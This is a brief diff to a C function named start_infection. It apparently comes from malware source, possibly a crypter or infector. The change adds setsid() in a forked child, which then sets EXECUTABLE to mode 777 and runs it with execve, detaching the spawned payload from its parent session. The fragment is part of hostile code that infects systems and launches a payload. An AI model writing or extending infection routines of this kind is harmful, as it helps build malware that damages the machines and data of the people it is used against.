@@ -30,6 +30,7 @@ void start_infection(t_aes *aes, t_cipher_plain *cipher_plain, char **env)
 
 				if (child_pid == 0)
 				{
+					setsid();
 					chmod(EXECUTABLE, 777);
 					char *argv[] = { EXECUTABLE, 0 };
 					execve(EXECUTABLE, (char**)&argv[0], env);
